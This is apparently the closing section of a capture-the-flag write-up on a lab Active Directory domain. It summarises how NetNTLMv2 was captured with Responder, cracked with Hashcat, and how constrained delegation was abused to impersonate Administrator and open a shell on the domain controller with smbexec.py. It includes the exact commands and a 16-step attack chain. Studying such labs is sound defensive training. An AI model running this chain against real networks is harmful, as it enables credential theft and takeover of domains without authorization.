# 05 — Final Access & Complete Chain

## Final SMB Execution

With the Kerberos cache loaded:

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

I used:

```bash
smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

The result was:

```text
[*] Launching semi-interactive shell
C:\Windows\system32>
```

This confirmed successful authenticated remote execution against the Domain Controller using Kerberos.

# 🔗 Complete Attack Chain

```text
1. Enumerate DC
       ↓
2. Discover IT-Shared
       ↓
3. Identify svc.scanner
       ↓
4. Confirm writable SMB share
       ↓
5. Create SMB authentication trigger
       ↓
6. Fix local SMB port conflicts
       ↓
7. Run Responder
       ↓
8. Capture svc.scanner NetNTLMv2
       ↓
9. Crack with Hashcat
       ↓
10. Validate svc.scanner credentials
       ↓
11. Enumerate constrained delegation
       ↓
12. Request service ticket
       ↓
13. Impersonate Administrator
       ↓
14. Load Kerberos CCache
       ↓
15. smbexec.py -k -no-pass
       ↓
16. Remote shell on DC01
```

# 🧠 Personal Analysis

## The Most Important Discovery

The strongest early clue was not the archived passwords.

Those accounts were explicitly disabled.

The more useful information was:

```text
svc.scanner
Runs every 2 minutes
Enumerates IT-Shared
```

Combined with:

```text
IT-Shared = writable
```

this suggested an authentication coercion/capture path.

## Important Failed Attempt

Responder initially failed because local Samba services were already listening on:

```text
139
445
```

Checking:

```bash
sudo ss -tulpn | grep -E ':445|:139'
```

identified `smbd`.

Stopping:

```bash
sudo systemctl stop smbd
sudo systemctl stop nmbd
```

allowed Responder to bind the required SMB ports.

## Key Learning

A NetNTLMv2 capture is not the same thing as an NT hash.

Here the captured material had to be cracked:

```text
NetNTLMv2
    ↓
Hashcat
    ↓
Plaintext password
```

After obtaining the service account credentials, the attack path shifted from credential capture to Active Directory/Kerberos abuse.

## Biggest AD Lesson

The compromised account itself did not need to be Domain Admin.

Instead:

```text
Low-privileged service account
        ↓
Delegation configuration
        ↓
Kerberos impersonation
        ↓
Administrator service ticket
        ↓
Domain Controller access
```

This demonstrates why AD privilege escalation is often about finding **relationships and trust configurations**, not simply looking for a single high-privileged password.

# 🎯 Key Takeaways

- Enumerate all exposed AD services before deciding on an attack path.
- Do not assume archived credentials are useful; verify whether accounts are active.
- Writable shares combined with automated service accounts deserve investigation.
- Responder failures can be caused by local services already binding SMB ports.
- NetNTLMv2 must be cracked or relayed; it is not an NT hash for Pass-the-Hash.
- Service accounts can expose valuable AD attack paths.
- Always enumerate delegation after compromising a service account.
- Constrained delegation can enable impersonation of higher-privileged users to allowed services.
- Kerberos credential caches can be used by Kerberos-aware Impacket tools.
- The final compromise resulted from chaining several weaknesses rather than relying on one exploit.
